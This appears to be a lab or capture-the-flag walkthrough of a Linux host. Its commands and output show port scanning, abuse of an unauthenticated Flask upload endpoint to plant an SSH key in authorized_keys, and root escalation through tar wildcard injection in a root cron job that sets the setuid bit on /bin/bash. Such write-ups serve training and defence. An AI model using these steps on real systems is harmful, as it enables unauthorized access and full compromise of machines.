@@ -1,0 +1,121 @@
+sudo nmap -sCV -p- -v -T4 -sT --open 192.168.172.249
+
+25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)
+| ssh-hostkey: 
+|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
+|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
+33414/tcp open  http    Werkzeug httpd 2.2.3 (Python 3.9.13)
+|_http-title: 404 Not Found
+|_http-server-header: Werkzeug/2.2.3 Python/3.9.13
+
+
+feroxbuster -u http://192.168.172.249:33414 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+200      GET        1l       19w      137c http://192.168.172.249:33414/help
+200      GET        1l       14w       98c http://192.168.172.249:33414/info
+["GET /info : General Info","GET /help : This listing","GET /file-list?dir=/tmp : List of the files","POST /file-upload : Upload files"]
+
+curl "http://192.168.172.249:33414/file-list?dir=/home"
+["alfredo"]
+
+curl -X POST -F "filename=test.txt" -F  "file=@test.txt" http://192.168.172.249:33414/file-upload
+{"message":"File successfully uploaded"}
+
+$ ssh-keygen                                            
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/home/alan/.ssh/id_ed25519): id_rsa
+
+that there some sort whitelisting done on the server. It only allows Allowed file types are txt, pdf, png, jpg, jpeg, gif So I changed the file type to .txt and tried to upload it
+mv id_rsa.pub id_rsa.txt
+curl  -i  -L -X POST -H "Content-type: multipart/form-data" -F file="@id_rsa.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.172.249:33414/file-upload
+
+chmod 600 id_rsa
+
+$ curl "http://192.168.172.249:33414/file-list?dir=/home/alfredo/.ssh"
+["id_rsa","id_rsa.pub","authorized_keys"]
+
+$ ssh alfredo@192.168.172.249 -i id_rsa -p 25022
+
+successful ssh in with alfredo privilege
+check which cron job is vulnerable.
+[afredo@fedora ~]$ cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+
+*/1 * * * * root /usr/local/bin/backup-flask.sh
+
+found /usr/local/bin/backup-flask.sh run as root every minutes.
+[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
+#!/bin/sh
+export PATH="/home/alfredo/restapi:$PATH"
+cd /home/alfredo/restapi
+tar czf /tmp/flask.tar.gz *
+
+Found run tar in the script.
+
+[alfredo@fedora ~]$ ls -ld /home/alfredo/restapi
+drwxr-xr-x. 3 alfredo alfredo 54 Mar 28  2023 /home/alfredo/restapi
+check target folder /home/alfredo/restapi privilege
+
+[alfredo@fedora ~]$ echo "chmod +s /bin/bash" > /home/alfredo/restapi/shell.sh
+chmod +x /home/alfredo/restapi/shell.sh
+[alfredo@fedora ~]$ cd /home/alfredo/restapi
+touch ./"--checkpoint=1"
+touch ./"--checkpoint-action=exec=sh shell.sh"
+
+create new script that change /bin/bash permissions.
+after 1 minute, [alfredo@fedora restapi]$ ls -l /bin/bash
+-rwsr-sr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
+
+[alfredo@fedora restapi]$ /bin/bash -p
+bash-5.1# id
+uid=1000(alfredo) gid=1000(alfredo) euid=0(root) egid=0(root) groups=0(root),1000(alfredo)
+bash-5.1# whoami
+root
+
+## Key takeaways
+1. discovery of the Flask REST API on a non-standard port (33414) 
+2. The /file-list?dir= endpoint provided unauthenticated directory traversal
+3. curl -F to simulate a multipart form-data upload, and send POST request to /file-upload to 
+test and found correct parameters. -F "filename=test.txt" -F  "file=@test.txt"
+4. known that target have a OpenSSH port on.
+5. use ssh-keygen to generate id_rsa key pair
+6. upload with coverted id_rsa.pub to id_rsa.txt as acceptable upload format
+7. upload with correct file name and Path. /home/alfredo/.ssh/authorized_keys
+8. after access in with standard privilege user, learnt The Tar Wildcard (Bash Gobbling)
+9. The Logic: When tar is executed with *, the shell expands that asterisk into filenames.
+10. cat /etc/crontab found a custom .sh script running as root.
+Inspect Script Contents: Don't just look at the filename; look at how it handles files
+11. By creating files named --checkpoint=1 and --checkpoint-action=exec=sh shell.sh, 
+you "tricked" the system into treating filenames as command-line arguments.
+The Payload: Since the cron job was executed by root, your shell.sh (which performed 
+chmod +s /bin/bash) also ran as root.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
